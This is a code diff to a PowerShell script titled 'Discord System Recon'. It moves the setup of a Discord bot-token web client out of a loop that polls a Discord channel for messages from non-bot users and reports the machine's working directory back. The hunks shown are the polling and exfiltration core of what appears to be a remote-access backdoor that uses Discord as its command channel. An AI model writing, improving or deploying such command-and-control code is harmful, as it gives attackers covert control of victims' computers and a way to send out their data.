@@ -1,3 +1,4 @@
+
 <# =========================================  Discord System Recon ===========================================
 
 **SYNOPSIS**
@@ -279,6 +280,9 @@ Function quickInfo{
 $doPowershell = {
 param([string]$token,[string]$PowershellID)
 
+    $url = "https://discord.com/api/v10/channels/$PowershellID/messages"
+    $w = New-Object System.Net.WebClient
+    $w.Headers.Add("Authorization", "Bot $token")
     function senddir{
         $dir = $PWD.Path
         $w.Headers.Add("Content-Type", "application/json")
@@ -287,10 +291,6 @@ param([string]$token,[string]$PowershellID)
     }
     senddir
     while($true){
-        
-        $url = "https://discord.com/api/v10/channels/$PowershellID/messages"
-        $w = New-Object System.Net.WebClient
-        $w.Headers.Add("Authorization", "Bot $token")
         $msg = $w.DownloadString($url)
         $r = ($msg | ConvertFrom-Json)[0]
         if(-not $r.author.bot){
